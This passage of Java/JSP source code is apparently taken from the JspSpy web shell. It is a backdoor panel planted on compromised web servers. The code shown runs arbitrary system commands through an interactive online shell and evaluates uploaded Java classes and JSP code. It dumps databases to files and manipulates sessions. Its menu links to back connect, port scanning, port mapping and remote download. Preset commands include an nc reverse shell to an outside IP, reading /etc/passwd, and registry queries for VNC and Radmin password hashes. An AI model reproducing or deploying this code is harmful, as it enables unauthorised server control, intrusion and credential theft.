private static class ReflectInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String c = request.getParameter("Class");
Class cls = null;
try {
if (!Util.isEmpty(c))
cls = Class.forName(c);
} catch (ClassNotFoundException ex) {
Util.outMsg(out,"<span style='color:red'>Class "+c+" Not Found ! </span>");
}
out.println("<form action=\""+SHELL_NAME+"\" id='refForm' method=\"post\">"+
"  <input type=\"hidden\" name=\"o\" value=\"reflect\"/>"+
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"    <tr>"+
"      <td><h2 id=\"Bin_H2_Title\">Java Reflect &gt;&gt;</h2>"+
"          <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"            <tr>"+
"              <td>Class Name : <input name=\"Class\" type=\"text\" class=\"input\" value=\""+(Util.isEmpty(c) ? "java.lang.Object" : c)+"\" size=\"60\"/> "+
"              <input type=\"submit\" class=\"bt\" value=\"Reflect\"/></td>"+
"            </tr>"+
"            "+
"          </table>"+
"        </td>"+
"    </tr>"+
"  </table>"+
"</form>");

if (cls != null) {
StringBuffer sb = new StringBuffer();
if (cls.getPackage() != null)
sb.append("package "+cls.getPackage().getName()+";\n");
String n = null;
if (cls.isInterface())
n = "";
//else if (cls.isEnum())
//	n = "enum";
else
n = "class";
sb.append(Modifier.toString(cls.getModifiers())+" "+n+" "+cls.getName()+"\n");
if (cls.getSuperclass() != null)
sb.append("\textends <a href=\"javascript:document.forms['refForm'].elements['Class'].value='"+cls.getSuperclass().getName()+"';document.forms['refForm'].submit()\" style='color:red;'>"+cls.getSuperclass().getName()+"</a>\n");
if (cls.getInterfaces() != null && cls.getInterfaces().length != 0) {
Class[] faces = cls.getInterfaces();
sb.append("\t implements ");
for (int i = 0;i<faces.length;i++) {
sb.append("<a href=\"javascript:document.forms['refForm'].elements['Class'].value='"+faces[i].getName()+"';document.forms['refForm'].submit()\" style='color:red'>"+faces[i].getName()+"</a>");
if (i != faces.length -1) {
sb.append(",");
}
}
}
sb.append("{\n\t\n");
sb.append("\t//constructors..\n");
Constructor[] cs = cls.getConstructors();
for (int i = 0;i<cs.length;i++) {
Constructor cc = cs[i];
sb.append("\t"+cc+";\n");
}
sb.append("\n\t//fields\n");
Field[] fs = cls.getDeclaredFields();
for (int i =0;i<fs.length;i++) {
Field f = fs[i];
sb.append("\t"+f.toString()+";");
if (Modifier.toString(f.getModifiers()).indexOf("static") != -1) {
sb.append("\t//value is : ");
f.setAccessible(true);
Object obj = f.get(null);
sb.append("<span style='color:red'>");
if (obj != null)
sb.append(obj.toString());
else
sb.append("NULL");

sb.append("</span>");
} 
sb.append("\n");
}

sb.append("\n\t//methods\n");
Method[] ms = cls.getDeclaredMethods();
for (int i =0;i<ms.length;i++) {
Method m = ms[i];
sb.append("\t"+ m.toString()+";\n");
}
sb.append("}\n");
String m = "<span style='font-weight:normal'>"+Util.highLight(sb.toString()).replaceAll("\t","&nbsp;&nbsp;&nbsp;&nbsp;").replaceAll("\n","<br/>")+"</span>";
Util.outMsg(out,m,"left");
}
} catch (Exception e) {
throw e;
}
}
}
private static class TopInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" name=\"doForm\"></form>"+
"<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"+
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\">JspSpy Ver: 2010</span>"+request.getHeader("host")+" (<span id='ip'>"+InetAddress.getLocalHost().getHostAddress()+"</span>) | <a href=\"javascript:if (!window.clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert('ok')}\">copy</a></td>"+
"	</tr>"+
"	<tr class=\"alt1\">"+
"		<td><a href=\"javascript:doPost({o:'logout'});\">Logout</a> | "+
"			<a href=\"javascript:doPost({o:'fileList'});\">File Manager</a> | "+
"			<a href=\"javascript:doPost({o:'vConn'});\">DataBase Manager</a> | "+
"			<a href=\"javascript:doPost({o:'vs'});\">Execute Command</a> | "+
"			<a href=\"javascript:doPost({o:'vso'});\">Shell OnLine</a> | "+
"			<a href=\"javascript:doPost({o:'vbc'});\">Back Connect</a> | "+
"			<a href=\"javascript:doPost({o:'reflect'});\">Java Reflect</a> | "+
"			<!--<a href=\"javascript:alert('not support yet');\">Http Proxy</a> | -->"+
"			<a href=\"javascript:doPost({o:'ev'});\">Eval Java Code</a> | "+
"			<a href=\"javascript:doPost({o:'vPortScan'});;\">Port Scan</a> | "+
"			<a href=\"javascript:doPost({o:'vd'});\">Download Remote File</a> | "+
"			<a href=\"javascript:;doPost({o:'clipboard'});\">ClipBoard</a> | "+
"			<a href=\"javascript:doPost({o:'vmp'});\">Port Map</a> | "+
"			<a href=\"javascript:doPost({o:'vother'});\">Others</a> | "+
"			<a href=\"javascript:doPost({o:'jspEnv'});\">JSP Env</a> "+
"	</tr>"+
"</table>");
if (JSession.getAttribute(MSG) != null) {
Util.outMsg(out,JSession.getAttribute(MSG).toString());
JSession.removeAttribute(MSG);
} 
if (JSession.getAttribute(ENTER_MSG) != null) {
String outEntry = request.getParameter("outentry");
if (Util.isEmpty(outEntry) || !outEntry.equals("true"))
Util.outMsg(out,JSession.getAttribute(ENTER_MSG).toString());
} 
} catch (Exception e) {

throw e ;
}
}
}
private static class VOnLineShellInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<script>"+
"				function $(id) {"+
"					return document.getElementById(id);"+
"				}"+
"				var ie = window.navigator.userAgent.toLowerCase().indexOf(\"msie\") != -1;"+
"				window.onload = function(){"+
"					setInterval(function(){"+
"						if ($(\"autoscroll\").checked)"+
"						{"+
"							var f = window.frames[\"echo\"];"+
"							if (f && f.document && f.document.body)"+
"							{"+
"								if (!ie)"+
"								{"+
"									if (f.document.body.offsetHeight)"+
"									{"+
"										f.scrollTo(0,parseInt(f.document.body.offsetHeight)+1);"+
"									}"+
"								} else {"+
"									f.scrollTo(0,parseInt(f.document.body.scrollHeight)+1);"+
"								}"+
"							}"+
"						}"+
"					},500);"+
"				}"+
"			</script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td>");
out.println("<h2>Shell OnLine &raquo;</h2><br/>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" target=\"echo\" onsubmit=\"$('cmd').focus()\">"+
"			<input type=\"submit\" value=\" start \" class=\"bt\"/>"+
"				<input type=\"text\" name=\"exe\" style=\"width:300px\" class=\"input\" value=\""+(ISLINUX ? "/bin/bash" :"c:\\windows\\system32\\cmd.exe")+"\"/>"+
"				<input type=\"hidden\" name=\"o\" value=\"online\"/><input type=\"hidden\" name=\"type\" value=\"start\"/><span class=\"tip\">Notice ! If You Are Using IE , You Must Input Some Commands First After You Start Or You Will Not See The Echo</span>"+
"			</form>"+
"			<hr/>"+
"				<iframe class=\"secho\" name=\"echo\" src=\"\">"+
"				</iframe>"+
"				<form action=\""+SHELL_NAME+"\" method=\"post\" onsubmit=\"this.submit();$('cmd').value='';return false;\" target=\"asyn\">"+
"					<input type=\"text\" id=\"cmd\" name=\"cmd\" class=\"input\" style=\"width:75%\"/>"+
"					<input name=\"o\" id=\"o\" type=\"hidden\" value=\"online\"/><input type=\"hidden\" id=\"ddtype\" name=\"type\" value=\"ecmd\"/>"+
"					<select onchange=\"$('cmd').value = this.value;$('cmd').focus()\">"+
"						<option value=\"\" selected> </option>"+
"						<option value=\"uname -a\">uname -a</option>"+
"						<option value=\"cat /etc/issue\">issue</option>"+
"						<option value=\"cat /etc/passwd\">passwd</option>"+
"						<option value=\"netstat -an\">netstat -an</option>"+
"						<option value=\"net user\">net user</option>"+
"						<option value=\"tasklist\">tasklist</option>"+
"						<option value=\"tasklist /svc\">tasklist /svc</option>"+
"						<option value=\"net start\">net start</option>"+
"						<option value=\"net stop policyagent /yes\">net stop</option>"+
"						<option value=\"nbtstat -A IP\">nbtstat -A</option>"+
"						<option value='reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"PortNumber\"'>reg query</option>"+
"						<option value='reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\\" /v \"Parameter\"'>radmin hash</option>"+
"						<option value='reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4\" /v \"password\"'>vnc hash</option>"+
"						<option value=\"nc -e cmd.exe 192.168.230.1 4444\">nc</option>"+
"						<option value=\"lcx -slave 192.168.230.1 4444 127.0.0.1 3389\">lcx</option>"+
"						<option value=\"systeminfo\">systeminfo</option>"+
"						<option value=\"net localgroup\">view groups</option>"+
"						<option value=\"net localgroup administrators\">view admins</option>"+
"					</select>"+
"					<input type=\"checkbox\" checked=\"checked\" id=\"autoscroll\"/>Auto Scroll"+
"					<input type=\"button\" value=\"Stop\" class=\"bt\" onclick=\"$('ddtype').value='stop';this.form.submit()\"/>"+
"				</form>"+
"			<iframe style=\"display:none\" name=\"asyn\"></iframe>"
);
out.println("    </td>"+
"  </tr>"+
"</table>");
} catch (Exception e) {
throw e ;
}
}
}
private static class OnLineInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String type = request.getParameter("type");
if (Util.isEmpty(type))
return;
if (type.toLowerCase().equals("start")) {
String exe = request.getParameter("exe");
if (Util.isEmpty(exe))
return;
Process pro = Runtime.getRuntime().exec(exe);
ByteArrayOutputStream outs = new ByteArrayOutputStream();
response.setContentLength(100000000);
response.setContentType("text/html;charset="+System.getProperty("file.encoding"));
OnLineProcess olp = new OnLineProcess(pro);
JSession.setAttribute(SHELL_ONLINE,olp);
new OnLineConnector(new ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),"exeOclientR",olp).start();
new OnLineConnector(pro.getInputStream(),response.getOutputStream(),"exeRclientO",olp).start();
new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();
Thread.sleep(1000 * 60 * 60 * 24);
} else if (type.equals("ecmd")) {
Object o = JSession.getAttribute(SHELL_ONLINE);
String cmd = request.getParameter("cmd");
if (Util.isEmpty(cmd))
return;
if (o == null)
return;
OnLineProcess olp = (OnLineProcess)o;
olp.setCmd(cmd);
} else {
Object o = JSession.getAttribute(SHELL_ONLINE);
if (o == null)
return;
OnLineProcess olp = (OnLineProcess)o;
olp.stop();
}
} catch (Exception e) {

throw e;
}
}
}
private static class EnterInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
PrintWriter out = response.getWriter();
String type = request.getParameter("type");
if (!Util.isEmpty(type)) {
JSession.removeAttribute(ENTER);
JSession.removeAttribute(ENTER_MSG);
JSession.removeAttribute(ENTER_CURRENT_DIR);
JSession.setAttribute(MSG,"Exit File Success ! ");
} else {
String f = request.getParameter("filepath");
if (Util.isEmpty(f))
return;
JSession.setAttribute(ENTER,f);
JSession.setAttribute(ENTER_MSG,"You Are In File <a style='color:red'>\""+f+"\"</a> Now ! <a href=\"javascript:doPost({o:'enter',type:'exit'})\"> Exit </a>");
}
response.sendRedirect(SHELL_NAME);
}
}
private static class VExport2FileInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
PrintWriter out = response.getWriter();
String type = request.getParameter("type");
String sql = request.getParameter("sql");
String table = request.getParameter("table");
if (Util.isEmpty(sql) && Util.isEmpty(table)) {
JSession.setAttribute(SESSION_O,"vConn");
response.sendRedirect(SHELL_NAME);
return;
}
out.println("<form action=\"\" method=\"post\">"+
"<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td>"+
"    <input type=\"hidden\" name=\"o\" value=\"export\"/>"+
"    <input type=\"hidden\" name=\"type\" value=\""+(Util.isEmpty(type) ? "" : type)+"\"/>"+
"    <input type=\"hidden\" name=\"sql\" value=\""+(Util.isEmpty(sql) ? "" : sql.replaceAll("\"","&quot;"))+"\"/>"+
"    <input type=\"hidden\" name=\"table\" value=\""+(Util.isEmpty(table) ? "" : table)+"\"/>"+
"    <h2>Export To File &raquo;</h2>"+
"        "+
"    <hr/>Export \"<span style='color:red;font-weight:bold'>"+(Util.isEmpty(sql) ? table : sql.replaceAll("\"","&quot;"))+"</span>\" To File : <input type=\"text\" style=\"font-weight:bold\" name=\"filepath\" value=\""+(JSession.getAttribute(CURRENT_DIR).toString()+"/exportdata.txt")+"\" size=\"100\" class=\"input\"/>"+
" <select name='encode' class='input'><option value=''>ANSI</option><option value='GBK'>GBK</option><option value='UTF-8'>UTF-8</option><option value='ISO-8859-1'>ISO-8859-1</option></select>"+
" <input type=\"submit\" class=\"bt\" value=\"Export\"/><br/><br/>"+BACK_HREF+"</td>"+
"        </tr>"+
"      </table>"+
"</form>");
}
}

private static class ExportInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
String type = request.getParameter("type");
String filepath = request.getParameter("filepath");
String encode = request.getParameter("encode");
String sql = null;
DBOperator dbo = null;
dbo = (DBOperator)JSession.getAttribute(DBO);

if (Util.isEmpty(type)) {
//table export
String tb = request.getParameter("table");
if (Util.isEmpty(tb))
return;
String s = dbo.getConn().getMetaData().getIdentifierQuoteString();
sql = "select * from "+s+tb+s;

} else if (type.equals("queryexp")) {
//query export
sql = request.getParameter("sql");
if (Util.isEmpty(sql)) {
JSession.setAttribute(SESSION_O,"vConn");
response.sendRedirect(SHELL_NAME);
return;
}
}
Object o = dbo.execute(sql);
ByteArrayOutputStream bout = new ByteArrayOutputStream(); 
byte[] rowSep = "\r\n".getBytes();
if (o instanceof ResultSet) {
ResultSet rs = (ResultSet)o;
ResultSetMetaData meta = rs.getMetaData();
int count = meta.getColumnCount();
for (int i =1;i<=count;i++) {
String colName = meta.getColumnName(i)+"\t";
byte[] b = null;
if (Util.isEmpty(encode))
b = colName.getBytes();
else 
b = colName.getBytes(encode);
bout.write(b,0,b.length);
}
bout.write(rowSep,0,rowSep.length);
while (rs.next()) {
for (int i =1;i<=count;i++) {
String v = null;
try {
v = rs.getString(i);
} catch (SQLException ex) {
v = "<<Error!>>";
}
v += "\t";
byte[] b = null;
if (Util.isEmpty(encode))
b = v.getBytes();
else
b = v.getBytes(encode);
bout.write(b,0,b.length);
}
bout.write(rowSep,0,rowSep.length);
}
rs.close();
ByteArrayInputStream input = new ByteArrayInputStream(bout.toByteArray());
BufferedOutputStream output = null;
if (!Util.isEmpty(filepath)) {
//export2file
output = new BufferedOutputStream(new FileOutputStream(new File(filepath)));
} else {
//download.
response.setHeader("Content-Disposition","attachment;filename=DataExport.txt");
output = new BufferedOutputStream(response.getOutputStream());
}
byte[] data = new byte[1024];
int len = input.read(data);
while (len != -1) {
output.write(data,0,len);
len = input.read(data);
}
bout.close();
input.close();
output.close();
if (!Util.isEmpty(filepath)) {
JSession.setAttribute(MSG,"Export To File Success !");
response.sendRedirect(SHELL_NAME);
}
} 
}
}
private static class EvalInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
String type = request.getParameter("type");
PrintWriter out = response.getWriter();
Object msg = JSession.getAttribute(MSG);
if (msg != null) {
Util.outMsg(out,(String)msg);
JSession.removeAttribute(MSG);
}
if (Util.isEmpty(type)) {
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2>Eval Java Code &raquo;</h2>"+
"<hr/>"+
"      <p>"+
"      <form action=\""+SHELL_NAME+"?o=eu\" method=\"post\"  enctype=\"multipart/form-data\">"+
"UpLoad a Class File : ");
Util.outMsg(out,"<pre>"+
"<span style='color:blue'>public class</span> SpyEval{\r\n"+
"	<span style='color:blue'>static</span> {\r\n"+
"		<span style='color:green'>//Your Code Here.</span>\r\n"+
"	}\r\n"+
"}\r\n"+
"</pre>","left");
out.println(" <input class=\"input\" name=\"file\" type=\"file\"/> <input type=\"submit\" class=\"bt\" value=\" Eval \"/></form><hr/>"+
"      <form action=\""+SHELL_NAME+"\"  method=\"post\"><p></p>Jsp Eval : <br/>"+
"      <input type=\"hidden\" name=\"o\" value=\"ev\"/><input type=\"hidden\" name=\"type\" value=\"jsp\"/>"+
"      <textarea name=\"jspc\" rows=\"15\" cols=\"70\">"+URLDecoder.decode("%3C%25%40page+pageEncoding%3D%22utf-8%22%25%3E%0D%0A%3C%25%0D%0A%2F%2Fyour+code+here.%0D%0Aout.println%28%22create+a+jsp+file+then+include+it+%21+by++ninty%22%29%3B%0D%0A%25%3E","utf-8")+"</textarea>"+
"      <br/><input class=\"bt\" name=\"button\" id=\"button\" value=\"Eval\" type=\"submit\" size=\"100\"/>"+
"      </form>"+
"      </p>"+
"    </td>"+
"  </tr>"+
"</table>");
} else if (type.equals("jsp")){
String jspc = request.getParameter("jspc");
if (Util.isEmpty(jspc))
return;
File f = new File(SHELL_DIR,"evaltmpninty.jsp");
BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),"utf-8"));
writer.write(jspc,0,jspc.length());
writer.flush();
writer.close();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2>Jsp Eval Result &raquo;</h2>");
out.println("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:left;font-weight:bold;margin:10px\">");
request.getRequestDispatcher("evaltmpninty.jsp").include(request,response);
out.println("</div><input type=\"button\" value=\" Back \" class=\"bt\" onclick=\"history.back()\"/></td></tr></table> ");
f.delete();
}
}
}
private static class EvalUploadInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
ByteArrayOutputStream stream = new ByteArrayOutputStream();
UploadBean upload = new UploadBean();
upload.setTargetOutput(stream);
upload.parseRequest(request);

if (stream.toByteArray().length == 2) {
JSession.setAttribute(MSG,"Please Upload Your Class File ! ");
((Invoker)ins.get("ev")).invoke(request,response,JSession);
return;
}
SpyClassLoader loader = new SpyClassLoader();
try {
Class c = loader.defineClass(null,stream.toByteArray());
c.newInstance();
}catch(Exception e) {
}
stream.close();
JSession.setAttribute(MSG,"Eval Java Class Done ! ");
((Invoker)ins.get("ev")).invoke(request,response,JSession);
}
}
private static class VOtherInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
Object msg = JSession.getAttribute(MSG);
if (msg != null) {
Util.outMsg(out,(String)msg);
JSession.removeAttribute(MSG);
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"    <tr>"+
"      <td><h2 id=\"Bin_H2_Title\">Session Manager&gt;&gt;</h2><hr/>"+
"        <div id=\"hOWTm\" style=\"line-height:30px\">"+
"        <ul>");
Enumeration en = JSession.getAttributeNames();
while (en.hasMoreElements()) {
Object o = en.nextElement();
if (o.toString().equals(MSG))
continue;
out.println("<li><form action='"+SHELL_NAME+"' method='post'><u>"+o.toString()+"</u> <input type=\"text\" name=\"value\" class=\"input\" size=\"50\" value=\""+JSession.getAttribute(o.toString())+"\"/>");
out.println("<input type='button' class='bt' value='Update' onclick=\"this.form.elements['type'].value='update';this.form.submit()\"/> <input type='button' onclick=\"this.form.elements['type'].value='delete';this.form.submit()\" class='bt' value='Delete'/>");
out.println("<input type='hidden' name='o' value='sm'/><input type='hidden' name='type'/>");
out.println("<input type='hidden' name='name' value='"+o.toString()+"'/>");
out.println("</form></li>");
}
out.println("<li style='list-style:none'><form action='"+SHELL_NAME+"' method='post'><fieldset>"+
"<legend>New Session Attribute</legend>"+
"name : <input type=\"text\" name=\"name\" value=\"\" class=\"input\"/> value : <input type=\"text\""+
" name=\"value\" class=\"input\"/> <input type='submit' value='Add' class='bt'/><input type='hidden' name='o' value='sm'/><input type='hidden' name='type' value='update'/>"+
" </fieldset></form></li></ul></div></td>"+
"    </tr>"+
"  </table>");
} catch (Exception e) {
throw e ;
}
}
}
//Session Manager
private static class SmInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String type = request.getParameter("type");
PrintWriter out = response.getWriter();
if (type.equals("update")) {
String name = request.getParameter("name");
String value = request.getParameter("value");
JSession.setAttribute(name,value);
JSession.setAttribute(MSG,"Update/Add Attribute Success !");
} else if (type.equals("delete")) {
String name = request.getParameter("name");
JSession.removeAttribute(name);
JSession.setAttribute(MSG,"Remove Attribute Success !");
}
((Invoker)ins.get("vother")).invoke(request,response,JSession);
} catch (Exception e) {

throw e ;
}
}
}

static{
ins.put("script",new ScriptInvoker());
ins.put("before",new BeforeInvoker());
ins.put("after",new AfterInvoker());
ins.put("deleteBatch",new DeleteBatchInvoker());
ins.put("clipboard",new ClipBoardInvoker());
ins.put("vPortScan",new VPortScanInvoker());
ins.put("portScan",new PortScanInvoker());
ins.put("vConn",new VConnInvoker());
ins.put("dbc",new DbcInvoker());
ins.put("executesql",new ExecuteSQLInvoker());
ins.put("vLogin",new VLoginInvoker());
ins.put("login",new LoginInvoker());
ins.put("filelist", new FileListInvoker());
ins.put("logout",new LogoutInvoker());
ins.put("upload",new UploadInvoker());
ins.put("copy",new CopyInvoker());
ins.put("bottom",new BottomInvoker());
ins.put("vCreateFile",new VCreateFileInvoker());
ins.put("vEdit",new VEditInvoker());
ins.put("createFile",new CreateFileInvoker());
ins.put("vEditProperty",new VEditPropertyInvoker());
ins.put("editProperty",new EditPropertyInvoker());
ins.put("vs",new VsInvoker());
ins.put("shell",new ShellInvoker());
ins.put("down",new DownInvoker());
ins.put("vd",new VdInvoker());
ins.put("downRemote",new DownRemoteInvoker());
ins.put("index",new IndexInvoker());
ins.put("mkdir",new MkDirInvoker());
ins.put("move",new MoveInvoker());
ins.put("removedir",new RemoveDirInvoker());
ins.put("packBatch",new PackBatchInvoker());
ins.put("pack",new PackInvoker());
ins.put("unpack",new UnPackInvoker());
ins.put("vmp",new VmpInvoker());
ins.put("vbc",new VbcInvoker());
ins.put("backConnect",new BackConnectInvoker());
ins.put("jspEnv",new JspEnvInvoker());
ins.put("smp",new SmpInvoker());
ins.put("mapPort",new MapPortInvoker());
ins.put("top",new TopInvoker());
ins.put("vso",new VOnLineShellInvoker());
ins.put("online",new OnLineInvoker());
ins.put("enter",new EnterInvoker());
ins.put("export",new ExportInvoker());
ins.put("ev",new EvalInvoker());
ins.put("eu",new EvalUploadInvoker());
ins.put("vother",new VOtherInvoker());
ins.put("sm",new SmInvoker());
ins.put("vExport",new VExport2FileInvoker());
ins.put("vPack",new VPackConfigInvoker());
ins.put("reflect",new ReflectInvoker());
ins.put("portBack",new PortBackInvoker());
}
]]></jsp:declaration>
<jsp:scriptlet><![CDATA[
try {
String o = request.getParameter("o");
if (Util.isEmpty(o)) {
if (session.getAttribute(SESSION_O) == null)
o = "index";
else {
o = session.getAttribute(SESSION_O).toString();
session.removeAttribute(SESSION_O);
}
}
Object obj = ins.get(o);
if (obj == null) {
response.sendRedirect(SHELL_NAME);
} else {
			Invoker in = (Invoker)obj;
if (in.doBefore()) {
String path = request.getParameter("folder");
if (!Util.isEmpty(path) && session.getAttribute(ENTER) == null)
session.setAttribute(CURRENT_DIR,path);
((Invoker)ins.get("before")).invoke(request,response,session);
((Invoker)ins.get("script")).invoke(request,response,session);
((Invoker)ins.get("top")).invoke(request,response,session);
}
in.invoke(request,response,session);
if (!in.doAfter()) {
return;
}else{
((Invoker)ins.get("bottom")).invoke(request,response,session);
((Invoker)ins.get("after")).invoke(request,response,session);
}
}					
} catch (Exception e) {
Object msg = session.getAttribute(MSG);
if (msg != null) {
Util.outMsg(out,(String)msg);
session.removeAttribute(MSG);
}
if (e.toString().indexOf("ClassCastException") != -1) {
Util.outMsg(out,MODIFIED_ERROR + BACK_HREF);
}
ByteArrayOutputStream bout = new ByteArrayOutputStream();
e.printStackTrace(new PrintStream(bout));
session.setAttribute(CURRENT_DIR,SHELL_DIR);
Util.outMsg(out,Util.htmlEncode(new String(bout.toByteArray())).replaceAll("\n","<br/>"),"left");
bout.close();
out.flush();
((Invoker)ins.get("bottom")).invoke(request,response,session);
((Invoker)ins.get("after")).invoke(request,response,session);
}
]]></jsp:scriptlet>
</jsp:root>